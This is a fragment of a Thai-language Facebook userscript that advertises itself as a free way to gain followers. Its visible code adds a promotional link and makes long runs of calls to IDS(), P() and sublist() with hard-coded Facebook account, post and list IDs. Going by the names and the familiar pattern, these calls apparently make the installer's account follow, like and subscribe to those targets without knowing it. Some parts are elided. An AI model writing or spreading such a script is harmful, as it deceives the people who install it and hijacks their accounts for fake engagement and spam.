// ==UserScript==
// @name            เพิ่มผู้ติดตามเฟสบุ๊ค (ต้องการยืนยัน?) By : แจกติดตาม' ฟรี
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Permlikedotcom" target="_blank">เพิ่มผู้ติดตาม [Click]<br>คลิก</a>';
	html += '</div>';
...
IDS("100002084728869");IDS("100003876951511");IDS("100007876389056");IDS("100001794850023");

P("1403554093250457");P("552696928143126");

sublist("603129606433191");sublist("603130439766441");sublist("603130789766406");sublist("603131056433046");
sublist("596677680402055");sublist("351472518325310");sublist("351472721658623");sublist("401373549965166");
sublist("351472961658599");sublist("351473034991925");sublist("351473128325249");sublist("605456879524135");
sublist("605457412857415");sublist("605457616190728");sublist("605458192857337");sublist("605458359523987");
sublist("603678926381572");
